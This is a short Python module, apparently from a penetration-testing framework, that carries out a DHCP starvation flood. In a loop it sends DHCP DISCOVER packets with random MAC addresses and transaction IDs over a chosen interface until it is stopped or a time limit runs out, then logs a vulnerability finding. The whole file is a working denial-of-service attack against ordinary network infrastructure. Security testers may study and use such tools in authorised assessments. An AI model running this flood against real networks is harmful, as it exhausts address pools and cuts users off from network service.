import time
from ptsrvtester.protocols.dhcp.utils.registry import sendp, prepare_discover_packet, random_xid, random_mac


__MODULELABEL__ = "DHCP DoS flood attack"
__MODULECODE__ = "denial"
__ORDER__ = 100


def _run_denial(ctx):
    """Run DHCP DoS flood attack"""
    ctx.out("Running DHCP DoS flood attack...", "WARNING", indent=4)
    ctx.out("Press Ctrl+C to stop", "INFO", indent=4)

    try:
        start_time = time.time()
        count = 0
        duration = ctx.duration if hasattr(ctx, 'duration') and ctx.duration else None

        while duration is None or (time.time() - start_time) < duration:
            sendp(prepare_discover_packet(ctx.mac or random_mac(), ctx.xid or random_xid()),
                  iface=ctx.interface, verbose=False)
            count += 1

            if count % 100 == 0:
                ctx.out(f"[*] Sent {count} DISCOVER packets", "INFO", indent=4)

    except KeyboardInterrupt:
        ctx.out("\n[!] DoS attack stopped by user", "INFO", indent=4)
    except Exception as e:
        ctx.out(f"[-] Error during DoS: {str(e)}", "ERROR", indent=4)

    ctx.out(f"[*] Total packets sent: {count}", "INFO", indent=4)
    ctx.ptjsonlib.add_vulnerabiltiy("PTV-DHCP-DOS")
    
def run(ctx):
    _run_denial(ctx)